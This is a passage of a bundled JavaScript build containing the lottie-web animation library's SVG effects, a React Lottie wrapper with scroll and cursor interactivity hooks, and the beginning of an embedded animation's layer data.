          ft.setAttribute("in", s + "_drop_shadow_1"),
          ft.setAttribute("result", s + "_drop_shadow_2"),
          (this.feOffset = ft),
          i.appendChild(ft);
        var ht = createNS("feFlood");
        ht.setAttribute("flood-color", "#00ff00"),
          ht.setAttribute("flood-opacity", "1"),
          ht.setAttribute("result", s + "_drop_shadow_3"),
          (this.feFlood = ht),
          i.appendChild(ht);
        var gt = createNS("feComposite");
        gt.setAttribute("in", s + "_drop_shadow_3"),
          gt.setAttribute("in2", s + "_drop_shadow_2"),
          gt.setAttribute("operator", "in"),
          gt.setAttribute("result", s + "_drop_shadow_4"),
          i.appendChild(gt);
        var St = this.createMergeNode(s, [s + "_drop_shadow_4", tt]);
        i.appendChild(St);
      }
      extendPrototype([SVGComposableEffect], SVGDropShadowEffect),
        (SVGDropShadowEffect.prototype.renderFrame = function (i) {
          if (i || this.filterManager._mdf) {
            if (
              ((i || this.filterManager.effectElements[4].p._mdf) &&
                this.feGaussianBlur.setAttribute(
                  "stdDeviation",
                  this.filterManager.effectElements[4].p.v / 4
                ),
              i || this.filterManager.effectElements[0].p._mdf)
            ) {
              var a = this.filterManager.effectElements[0].p.v;
              this.feFlood.setAttribute(
                "flood-color",
                rgbToHex(
                  Math.round(a[0] * 255),
                  Math.round(a[1] * 255),
                  Math.round(a[2] * 255)
                )
              );
            }
            if (
              ((i || this.filterManager.effectElements[1].p._mdf) &&
                this.feFlood.setAttribute(
                  "flood-opacity",
                  this.filterManager.effectElements[1].p.v / 255
                ),
              i ||
                this.filterManager.effectElements[2].p._mdf ||
                this.filterManager.effectElements[3].p._mdf)
            ) {
              var o = this.filterManager.effectElements[3].p.v,
                s = (this.filterManager.effectElements[2].p.v - 90) * degToRads,
                tt = o * Math.cos(s),
                nt = o * Math.sin(s);
              this.feOffset.setAttribute("dx", tt),
                this.feOffset.setAttribute("dy", nt);
            }
          }
        });
      var _svgMatteSymbols = [];
      function SVGMatte3Effect(i, a, o) {
        (this.initialized = !1),
          (this.filterManager = a),
          (this.filterElem = i),
          (this.elem = o),
          (o.matteElement = createNS("g")),
          o.matteElement.appendChild(o.layerElement),
          o.matteElement.appendChild(o.transformedElement),
          (o.baseElement = o.matteElement);
      }
      (SVGMatte3Effect.prototype.findSymbol = function (i) {
        for (var a = 0, o = _svgMatteSymbols.length; a < o; ) {
          if (_svgMatteSymbols[a] === i) return _svgMatteSymbols[a];
          a += 1;
        }
        return null;
      }),
        (SVGMatte3Effect.prototype.replaceInParent = function (i, a) {
          var o = i.layerElement.parentNode;
          if (o) {
            for (
              var s = o.children, tt = 0, nt = s.length;
              tt < nt && s[tt] !== i.layerElement;

            )
              tt += 1;
            var ot;
            tt <= nt - 2 && (ot = s[tt + 1]);
            var st = createNS("use");
            st.setAttribute("href", "#" + a),
              ot ? o.insertBefore(st, ot) : o.appendChild(st);
          }
        }),
        (SVGMatte3Effect.prototype.setElementAsMask = function (i, a) {
          if (!this.findSymbol(a)) {
            var o = createElementID(),
              s = createNS("mask");
            s.setAttribute("id", a.layerId),
              s.setAttribute("mask-type", "alpha"),
              _svgMatteSymbols.push(a);
            var tt = i.globalData.defs;
            tt.appendChild(s);
            var nt = createNS("symbol");
            nt.setAttribute("id", o),
              this.replaceInParent(a, o),
              nt.appendChild(a.layerElement),
              tt.appendChild(nt);
            var ot = createNS("use");
            ot.setAttribute("href", "#" + o),
              s.appendChild(ot),
              (a.data.hd = !1),
              a.show();
          }
          i.setMatte(a.layerId);
        }),
        (SVGMatte3Effect.prototype.initialize = function () {
          for (
            var i = this.filterManager.effectElements[0].p.v,
              a = this.elem.comp.elements,
              o = 0,
              s = a.length;
            o < s;

          )
            a[o] &&
              a[o].data.ind === i &&
              this.setElementAsMask(this.elem, a[o]),
              (o += 1);
          this.initialized = !0;
        }),
        (SVGMatte3Effect.prototype.renderFrame = function () {
          this.initialized || this.initialize();
        });
      function SVGGaussianBlurEffect(i, a, o, s) {
        i.setAttribute("x", "-100%"),
          i.setAttribute("y", "-100%"),
          i.setAttribute("width", "300%"),
          i.setAttribute("height", "300%"),
          (this.filterManager = a);
        var tt = createNS("feGaussianBlur");
        tt.setAttribute("result", s),
          i.appendChild(tt),
          (this.feGaussianBlur = tt);
      }
      SVGGaussianBlurEffect.prototype.renderFrame = function (i) {
        if (i || this.filterManager._mdf) {
          var a = 0.3,
            o = this.filterManager.effectElements[0].p.v * a,
            s = this.filterManager.effectElements[1].p.v,
            tt = s == 3 ? 0 : o,
            nt = s == 2 ? 0 : o;
          this.feGaussianBlur.setAttribute("stdDeviation", tt + " " + nt);
          var ot =
            this.filterManager.effectElements[2].p.v == 1
              ? "wrap"
              : "duplicate";
          this.feGaussianBlur.setAttribute("edgeMode", ot);
        }
      };
      function TransformEffect() {}
      (TransformEffect.prototype.init = function (i) {
        (this.effectsManager = i),
          (this.type = effectTypes.TRANSFORM_EFFECT),
          (this.matrix = new Matrix()),
          (this.opacity = -1),
          (this._mdf = !1),
          (this._opMdf = !1);
      }),
        (TransformEffect.prototype.renderFrame = function (i) {
          if (
            ((this._opMdf = !1),
            (this._mdf = !1),
            i || this.effectsManager._mdf)
          ) {
            var a = this.effectsManager.effectElements,
              o = a[0].p.v,
              s = a[1].p.v,
              tt = a[2].p.v === 1,
              nt = a[3].p.v,
              ot = tt ? nt : a[4].p.v,
              st = a[5].p.v,
              ft = a[6].p.v,
              ht = a[7].p.v;
            this.matrix.reset(),
              this.matrix.translate(-o[0], -o[1], o[2]),
              this.matrix.scale(ot * 0.01, nt * 0.01, 1),
              this.matrix.rotate(-ht * degToRads),
              this.matrix.skewFromAxis(-st * degToRads, (ft + 90) * degToRads),
              this.matrix.translate(s[0], s[1], 0),
              (this._mdf = !0),
              this.opacity !== a[8].p.v &&
                ((this.opacity = a[8].p.v), (this._opMdf = !0));
          }
        });
      function SVGTransformEffect(i, a) {
        this.init(a);
      }
      extendPrototype([TransformEffect], SVGTransformEffect);
      function CVTransformEffect(i) {
        this.init(i);
      }
      return (
        extendPrototype([TransformEffect], CVTransformEffect),
        registerRenderer("canvas", CanvasRenderer),
        registerRenderer("html", HybridRenderer),
        registerRenderer("svg", SVGRenderer),
        ShapeModifiers.registerModifier("tm", TrimModifier),
        ShapeModifiers.registerModifier("pb", PuckerAndBloatModifier),
        ShapeModifiers.registerModifier("rp", RepeaterModifier),
        ShapeModifiers.registerModifier("rd", RoundCornersModifier),
        ShapeModifiers.registerModifier("zz", ZigZagModifier),
        ShapeModifiers.registerModifier("op", OffsetPathModifier),
        setExpressionsPlugin(Expressions),
        setExpressionInterfaces(getInterface),
        initialize$1(),
        initialize(),
        registerEffect$1(20, SVGTintFilter, !0),
        registerEffect$1(21, SVGFillFilter, !0),
        registerEffect$1(22, SVGStrokeEffect, !1),
        registerEffect$1(23, SVGTritoneFilter, !0),
        registerEffect$1(24, SVGProLevelsFilter, !0),
        registerEffect$1(25, SVGDropShadowEffect, !0),
        registerEffect$1(28, SVGMatte3Effect, !1),
        registerEffect$1(29, SVGGaussianBlurEffect, !0),
        registerEffect$1(35, SVGTransformEffect, !1),
        registerEffect(35, CVTransformEffect),
        lottie
      );
    });
})(lottie$1, lottie$1.exports);
var lottieExports = lottie$1.exports;
const lottie = getDefaultExportFromCjs(lottieExports);
function _iterableToArrayLimit(i, a) {
  var o =
    i == null
      ? null
      : (typeof Symbol < "u" && i[Symbol.iterator]) || i["@@iterator"];
  if (o != null) {
    var s,
      tt,
      nt,
      ot,
      st = [],
      ft = !0,
      ht = !1;
    try {
      if (((nt = (o = o.call(i)).next), a !== 0))
        for (
          ;
          !(ft = (s = nt.call(o)).done) && (st.push(s.value), st.length !== a);
          ft = !0
        );
    } catch (gt) {
      (ht = !0), (tt = gt);
    } finally {
      try {
        if (!ft && o.return != null && ((ot = o.return()), Object(ot) !== ot))
          return;
      } finally {
        if (ht) throw tt;
      }
    }
    return st;
  }
}
function ownKeys(i, a) {
  var o = Object.keys(i);
  if (Object.getOwnPropertySymbols) {
    var s = Object.getOwnPropertySymbols(i);
    a &&
      (s = s.filter(function (tt) {
        return Object.getOwnPropertyDescriptor(i, tt).enumerable;
      })),
      o.push.apply(o, s);
  }
  return o;
}
function _objectSpread2(i) {
  for (var a = 1; a < arguments.length; a++) {
    var o = arguments[a] != null ? arguments[a] : {};
    a % 2
      ? ownKeys(Object(o), !0).forEach(function (s) {
          _defineProperty(i, s, o[s]);
        })
      : Object.getOwnPropertyDescriptors
      ? Object.defineProperties(i, Object.getOwnPropertyDescriptors(o))
      : ownKeys(Object(o)).forEach(function (s) {
          Object.defineProperty(i, s, Object.getOwnPropertyDescriptor(o, s));
        });
  }
  return i;
}
function _defineProperty(i, a, o) {
  return (
    (a = _toPropertyKey(a)),
    a in i
      ? Object.defineProperty(i, a, {
          value: o,
          enumerable: !0,
          configurable: !0,
          writable: !0,
        })
      : (i[a] = o),
    i
  );
}
function _objectWithoutPropertiesLoose(i, a) {
  if (i == null) return {};
  var o = {},
    s = Object.keys(i),
    tt,
    nt;
  for (nt = 0; nt < s.length; nt++)
    (tt = s[nt]), !(a.indexOf(tt) >= 0) && (o[tt] = i[tt]);
  return o;
}
function _objectWithoutProperties(i, a) {
  if (i == null) return {};
  var o = _objectWithoutPropertiesLoose(i, a),
    s,
    tt;
  if (Object.getOwnPropertySymbols) {
    var nt = Object.getOwnPropertySymbols(i);
    for (tt = 0; tt < nt.length; tt++)
      (s = nt[tt]),
        !(a.indexOf(s) >= 0) &&
          Object.prototype.propertyIsEnumerable.call(i, s) &&
          (o[s] = i[s]);
  }
  return o;
}
function _slicedToArray(i, a) {
  return (
    _arrayWithHoles(i) ||
    _iterableToArrayLimit(i, a) ||
    _unsupportedIterableToArray(i, a) ||
    _nonIterableRest()
  );
}
function _arrayWithHoles(i) {
  if (Array.isArray(i)) return i;
}
function _unsupportedIterableToArray(i, a) {
  if (i) {
    if (typeof i == "string") return _arrayLikeToArray(i, a);
    var o = Object.prototype.toString.call(i).slice(8, -1);
    if (
      (o === "Object" && i.constructor && (o = i.constructor.name),
      o === "Map" || o === "Set")
    )
      return Array.from(i);
    if (o === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(o))
      return _arrayLikeToArray(i, a);
  }
}
function _arrayLikeToArray(i, a) {
  (a == null || a > i.length) && (a = i.length);
  for (var o = 0, s = new Array(a); o < a; o++) s[o] = i[o];
  return s;
}
function _nonIterableRest() {
  throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`);
}
function _toPrimitive(i, a) {
  if (typeof i != "object" || i === null) return i;
  var o = i[Symbol.toPrimitive];
  if (o !== void 0) {
    var s = o.call(i, a || "default");
    if (typeof s != "object") return s;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return (a === "string" ? String : Number)(i);
}
function _toPropertyKey(i) {
  var a = _toPrimitive(i, "string");
  return typeof a == "symbol" ? a : String(a);
}
var _excluded$1 = [
    "animationData",
    "loop",
    "autoplay",
    "initialSegment",
    "onComplete",
    "onLoopComplete",
    "onEnterFrame",
    "onSegmentStart",
    "onConfigReady",
    "onDataReady",
    "onDataFailed",
    "onLoadedImages",
    "onDOMLoaded",
    "onDestroy",
    "lottieRef",
    "renderer",
    "name",
    "assetsPath",
    "rendererSettings",
  ],
  useLottie = function i(a, o) {
    var s = a.animationData,
      tt = a.loop,
      nt = a.autoplay,
      ot = a.initialSegment,
      st = a.onComplete,
      ft = a.onLoopComplete,
      ht = a.onEnterFrame,
      gt = a.onSegmentStart,
      St = a.onConfigReady,
      vt = a.onDataReady,
      _t = a.onDataFailed,
      Et = a.onLoadedImages,
      Ct = a.onDOMLoaded,
      Pt = a.onDestroy;
    a.lottieRef, a.renderer, a.name, a.assetsPath, a.rendererSettings;
    var bt = _objectWithoutProperties(a, _excluded$1),
      xt = reactExports.useState(!1),
      yt = _slicedToArray(xt, 2),
      wt = yt[0],
      $t = yt[1],
      kt = reactExports.useRef(),
      Rt = reactExports.useRef(null),
      It = function () {
        var Dt;
        (Dt = kt.current) === null || Dt === void 0 || Dt.play();
      },
      Ot = function () {
        var Dt;
        (Dt = kt.current) === null || Dt === void 0 || Dt.stop();
      },
      Nt = function () {
        var Dt;
        (Dt = kt.current) === null || Dt === void 0 || Dt.pause();
      },
      zt = function (Dt) {
        var Ut;
        (Ut = kt.current) === null || Ut === void 0 || Ut.setSpeed(Dt);
      },
      Bt = function (Dt, Ut) {
        var Ht;
        (Ht = kt.current) === null || Ht === void 0 || Ht.goToAndPlay(Dt, Ut);
      },
      Wt = function (Dt, Ut) {
        var Ht;
        (Ht = kt.current) === null || Ht === void 0 || Ht.goToAndStop(Dt, Ut);
      },
      Gt = function (Dt) {
        var Ut;
        (Ut = kt.current) === null || Ut === void 0 || Ut.setDirection(Dt);
      },
      Vt = function (Dt, Ut) {
        var Ht;
        (Ht = kt.current) === null || Ht === void 0 || Ht.playSegments(Dt, Ut);
      },
      Mt = function (Dt) {
        var Ut;
        (Ut = kt.current) === null || Ut === void 0 || Ut.setSubframe(Dt);
      },
      Ft = function (Dt) {
        var Ut;
        return (Ut = kt.current) === null || Ut === void 0
          ? void 0
          : Ut.getDuration(Dt);
      },
      Tt = function () {
        var Dt;
        (Dt = kt.current) === null || Dt === void 0 || Dt.destroy(),
          (kt.current = void 0);
      },
      At = function () {
        var Dt =
            arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {},
          Ut;
        if (Rt.current) {
          (Ut = kt.current) === null || Ut === void 0 || Ut.destroy();
          var Ht = _objectSpread2(
            _objectSpread2(_objectSpread2({}, a), Dt),
            {},
            { container: Rt.current }
          );
          return (
            (kt.current = lottie.loadAnimation(Ht)),
            $t(!!kt.current),
            function () {
              var Kt;
              (Kt = kt.current) === null || Kt === void 0 || Kt.destroy(),
                (kt.current = void 0);
            }
          );
        }
      };
    reactExports.useEffect(
      function () {
        var jt = At();
        return function () {
          return jt == null ? void 0 : jt();
        };
      },
      [s, tt]
    ),
      reactExports.useEffect(
        function () {
          kt.current && (kt.current.autoplay = !!nt);
        },
        [nt]
      ),
      reactExports.useEffect(
        function () {
          if (kt.current) {
            if (!ot) {
              kt.current.resetSegments(!0);
              return;
            }
            !Array.isArray(ot) ||
              !ot.length ||
              ((kt.current.currentRawFrame < ot[0] ||
                kt.current.currentRawFrame > ot[1]) &&
                (kt.current.currentRawFrame = ot[0]),
              kt.current.setSegment(ot[0], ot[1]));
          }
        },
        [ot]
      ),
      reactExports.useEffect(
        function () {
          var jt = [
              { name: "complete", handler: st },
              { name: "loopComplete", handler: ft },
              { name: "enterFrame", handler: ht },
              { name: "segmentStart", handler: gt },
              { name: "config_ready", handler: St },
              { name: "data_ready", handler: vt },
              { name: "data_failed", handler: _t },
              { name: "loaded_images", handler: Et },
              { name: "DOMLoaded", handler: Ct },
              { name: "destroy", handler: Pt },
            ],
            Dt = jt.filter(function (Ht) {
              return Ht.handler != null;
            });
          if (Dt.length) {
            var Ut = Dt.map(function (Ht) {
              var Kt;
              return (
                (Kt = kt.current) === null ||
                  Kt === void 0 ||
                  Kt.addEventListener(Ht.name, Ht.handler),
                function () {
                  var qt;
                  (qt = kt.current) === null ||
                    qt === void 0 ||
                    qt.removeEventListener(Ht.name, Ht.handler);
                }
              );
            });
            return function () {
              Ut.forEach(function (Ht) {
                return Ht();
              });
            };
          }
        },
        [st, ft, ht, gt, St, vt, _t, Et, Ct, Pt]
      );
    var Lt = React$1.createElement(
      "div",
      _objectSpread2({ style: o, ref: Rt }, bt)
    );
    return {
      View: Lt,
      play: It,
      stop: Ot,
      pause: Nt,
      setSpeed: zt,
      goToAndStop: Wt,
      goToAndPlay: Bt,
      setDirection: Gt,
      playSegments: Vt,
      setSubframe: Mt,
      getDuration: Ft,
      destroy: Tt,
      animationContainerRef: Rt,
      animationLoaded: wt,
      animationItem: kt.current,
    };
  };
function getContainerVisibility(i) {
  var a = i.getBoundingClientRect(),
    o = a.top,
    s = a.height,
    tt = window.innerHeight - o,
    nt = window.innerHeight + s;
  return tt / nt;
}
function getContainerCursorPosition(i, a, o) {
  var s = i.getBoundingClientRect(),
    tt = s.top,
    nt = s.left,
    ot = s.width,
    st = s.height,
    ft = (a - nt) / ot,
    ht = (o - tt) / st;
  return { x: ft, y: ht };
}
var useInitInteractivity = function i(a) {
    var o = a.wrapperRef,
      s = a.animationItem,
      tt = a.mode,
      nt = a.actions;
    reactExports.useEffect(
      function () {
        var ot = o.current;
        if (!(!ot || !s || !nt.length)) {
          s.stop();
          var st = function () {
              var gt = null,
                St = function () {
                  var _t = getContainerVisibility(ot),
                    Et = nt.find(function (Pt) {
                      var bt = Pt.visibility;
                      return bt && _t >= bt[0] && _t <= bt[1];
                    });
                  if (Et) {
                    if (
                      Et.type === "seek" &&
                      Et.visibility &&
                      Et.frames.length === 2
                    ) {
                      var Ct =
                        Et.frames[0] +
                        Math.ceil(
                          ((_t - Et.visibility[0]) /
                            (Et.visibility[1] - Et.visibility[0])) *
                            Et.frames[1]
                        ); //! goToAndStop must be relative to the start of the current segment
                      s.goToAndStop(Ct - s.firstFrame - 1, !0);
                    }
                    Et.type === "loop" &&
                      (gt === null || gt !== Et.frames || s.isPaused) &&
                      (s.playSegments(Et.frames, !0), (gt = Et.frames)),
                      Et.type === "play" &&
                        s.isPaused &&
                        (s.resetSegments(!0), s.play()),
                      Et.type === "stop" &&
                        s.goToAndStop(Et.frames[0] - s.firstFrame - 1, !0);
                  }
                };
              return (
                document.addEventListener("scroll", St),
                function () {
                  document.removeEventListener("scroll", St);
                }
              );
            },
            ft = function () {
              var gt = function (Et, Ct) {
                  var Pt = Et,
                    bt = Ct;
                  if (Pt !== -1 && bt !== -1) {
                    var xt = getContainerCursorPosition(ot, Pt, bt);
                    (Pt = xt.x), (bt = xt.y);
                  }
                  var yt = nt.find(function (kt) {
                    var Rt = kt.position;
                    return Rt && Array.isArray(Rt.x) && Array.isArray(Rt.y)
                      ? Pt >= Rt.x[0] &&
                          Pt <= Rt.x[1] &&
                          bt >= Rt.y[0] &&
                          bt <= Rt.y[1]
                      : Rt && !Number.isNaN(Rt.x) && !Number.isNaN(Rt.y)
                      ? Pt === Rt.x && bt === Rt.y
                      : !1;
                  });
                  if (yt) {
                    if (
                      yt.type === "seek" &&
                      yt.position &&
                      Array.isArray(yt.position.x) &&
                      Array.isArray(yt.position.y) &&
                      yt.frames.length === 2
                    ) {
                      var wt =
                          (Pt - yt.position.x[0]) /
                          (yt.position.x[1] - yt.position.x[0]),
                        $t =
                          (bt - yt.position.y[0]) /
                          (yt.position.y[1] - yt.position.y[0]);
                      s.playSegments(yt.frames, !0),
                        s.goToAndStop(
                          Math.ceil(
                            ((wt + $t) / 2) * (yt.frames[1] - yt.frames[0])
                          ),
                          !0
                        );
                    }
                    yt.type === "loop" && s.playSegments(yt.frames, !0),
                      yt.type === "play" &&
                        (s.isPaused && s.resetSegments(!1),
                        s.playSegments(yt.frames)),
                      yt.type === "stop" && s.goToAndStop(yt.frames[0], !0);
                  }
                },
                St = function (Et) {
                  gt(Et.clientX, Et.clientY);
                },
                vt = function () {
                  gt(-1, -1);
                };
              return (
                ot.addEventListener("mousemove", St),
                ot.addEventListener("mouseout", vt),
                function () {
                  ot.removeEventListener("mousemove", St),
                    ot.removeEventListener("mouseout", vt);
                }
              );
            };
          switch (tt) {
            case "scroll":
              return st();
            case "cursor":
              return ft();
          }
        }
      },
      [tt, s]
    );
  },
  useLottieInteractivity = function i(a) {
    var o = a.actions,
      s = a.mode,
      tt = a.lottieObj,
      nt = tt.animationItem,
      ot = tt.View,
      st = tt.animationContainerRef;
    return (
      useInitInteractivity({
        actions: o,
        animationItem: nt,
        mode: s,
        wrapperRef: st,
      }),
      ot
    );
  },
  _excluded = ["style", "interactivity"],
  Lottie = function i(a) {
    var o,
      s,
      tt,
      nt = a.style,
      ot = a.interactivity,
      st = _objectWithoutProperties(a, _excluded),
      ft = useLottie(st, nt),
      ht = ft.View,
      gt = ft.play,
      St = ft.stop,
      vt = ft.pause,
      _t = ft.setSpeed,
      Et = ft.goToAndStop,
      Ct = ft.goToAndPlay,
      Pt = ft.setDirection,
      bt = ft.playSegments,
      xt = ft.setSubframe,
      yt = ft.getDuration,
      wt = ft.destroy,
      $t = ft.animationContainerRef,
      kt = ft.animationLoaded,
      Rt = ft.animationItem;
    return (
      reactExports.useEffect(
        function () {
          a.lottieRef &&
            (a.lottieRef.current = {
              play: gt,
              stop: St,
              pause: vt,
              setSpeed: _t,
              goToAndPlay: Ct,
              goToAndStop: Et,
              setDirection: Pt,
              playSegments: bt,
              setSubframe: xt,
              getDuration: yt,
              destroy: wt,
              animationContainerRef: $t,
              animationLoaded: kt,
              animationItem: Rt,
            });
        },
        [(o = a.lottieRef) === null || o === void 0 ? void 0 : o.current]
      ),
      useLottieInteractivity({
        lottieObj: {
          View: ht,
          play: gt,
          stop: St,
          pause: vt,
          setSpeed: _t,
          goToAndStop: Et,
          goToAndPlay: Ct,
          setDirection: Pt,
          playSegments: bt,
          setSubframe: xt,
          getDuration: yt,
          destroy: wt,
          animationContainerRef: $t,
          animationLoaded: kt,
          animationItem: Rt,
        },
        actions:
          (s = ot == null ? void 0 : ot.actions) !== null && s !== void 0
            ? s
            : [],
        mode:
          (tt = ot == null ? void 0 : ot.mode) !== null && tt !== void 0
            ? tt
            : "scroll",
      })
    );
  };
const v$1 = "5.5.7",
  meta = { g: "LottieFiles AE 0.1.21", a: "", k: "", d: "", tc: "" },
  fr = 60,
  ip = 0,
  op = 120,
  w$1 = 400,
  h = 200,
  nm = "Comp 1",
  ddd = 0,
  assets = [],
  fonts = {
    list: [
      {
        fName: "URWDIN-Medium",
        fFamily: "URW DIN",
        fStyle: "Medium",
        ascent: 71.39892578125,
      },
    ],
  },
  layers = [
    {
      ddd: 0,
      ind: 1,
      ty: 4,
      nm: "Shape Layer 2",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 2,
      ty: 5,
      nm: "L",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [91.7, -96.007, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [91.7, 14.993, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [91.7, 14.993, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [91.7, 676.493, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [1.2, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\rL\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 3,
      ty: 4,
      nm: "Shape Layer 3",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 4,
      ty: 5,
      nm: "O",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [127.473, 620.993, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [127.473, 455.993, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [127.473, 455.993, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [127.473, -482.507, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [0.11, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\rO\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 5,
      ty: 4,
      nm: "Shape Layer 4",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
